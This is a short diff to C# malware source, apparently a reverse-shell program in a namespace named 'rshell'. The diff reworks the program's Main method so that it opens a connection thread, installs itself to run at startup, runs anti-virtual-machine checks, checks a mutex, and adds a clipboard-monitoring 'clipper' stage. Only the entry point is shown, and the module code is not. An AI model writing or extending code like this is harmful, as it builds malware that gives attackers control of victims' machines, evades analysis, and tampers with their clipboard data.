@@ -13,7 +13,6 @@ using System.Collections.Generic;
 using static Crying.Helpers.Common;
 using System.Net.NetworkInformation;
 
-
 namespace rshell
 { 
         static class Rshell
@@ -29,14 +28,22 @@ namespace rshell
             private delegate void Code();
 
         static void Main()
-            {
+        {
             //connect
-
             new Thread(Join).Start();
-                Installer.Install();
-                AntiVM.Runner();
-            }
 
+            // Set to startup
+            Installer.Install();
+
+            // Check VM's
+            AntiVM.Runner();
+
+            // Check mutex
+            clipper.modules.AppMutex.Check();
+
+            // Start clipper
+            clipper.modules.ClipboardMonitor.run();
+            }
             static void Join()
             {
                 int x = 0;
